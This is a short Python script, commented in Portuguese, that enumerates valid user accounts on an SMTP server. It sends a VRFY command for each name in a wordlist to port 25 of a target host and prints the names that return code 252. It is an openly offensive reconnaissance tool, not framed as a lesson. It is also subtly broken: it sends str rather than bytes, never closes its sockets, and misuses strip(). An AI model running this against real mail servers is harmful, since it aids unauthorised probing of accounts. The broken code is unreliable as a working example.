#!/usr/bin/python
# brute_force_smtp.py
# Data: 18/05/2022
# Criador: Reinaldo Garcia
# Descrição: Script para fazer Brute Force no SMTP

import socket, sys, re

hostname = str(sys.argv[1])
file = open("lista.txt")

for linha in file:
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.connect((hostname,25))
    banner = tcp.recv(1024)
    tcp.send("VRFY "+linha)
    user = tcp.recv(1024)
    if re.search("252",user):
        print(f"Usuario encontrato: ", user.strip("252 2.0.0"))
